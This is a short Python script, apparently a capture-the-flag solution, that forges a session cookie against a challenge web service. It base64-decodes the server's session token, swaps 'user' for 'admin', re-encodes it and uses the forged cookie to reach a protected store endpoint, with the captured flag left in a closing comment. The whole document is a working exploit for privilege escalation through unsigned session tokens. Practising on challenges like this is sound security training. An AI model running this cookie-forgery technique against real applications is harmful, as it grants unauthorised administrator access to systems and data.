import requests
import base64

s = requests.session()
s.get("http://pwnme.org:8888/api/v1/init")
cookie = s.cookies['session_token']
new = base64.b64encode(base64.b64decode(cookie).replace(b'user',b'admin')).decode()

s.cookies.set("session_token", None)
s.cookies.set("session_token", new)
auth = s.get("http://pwnme.org:8888/api/v1/store")
print(auth.text)
# SecVal{I_LIKE_C00K1S}
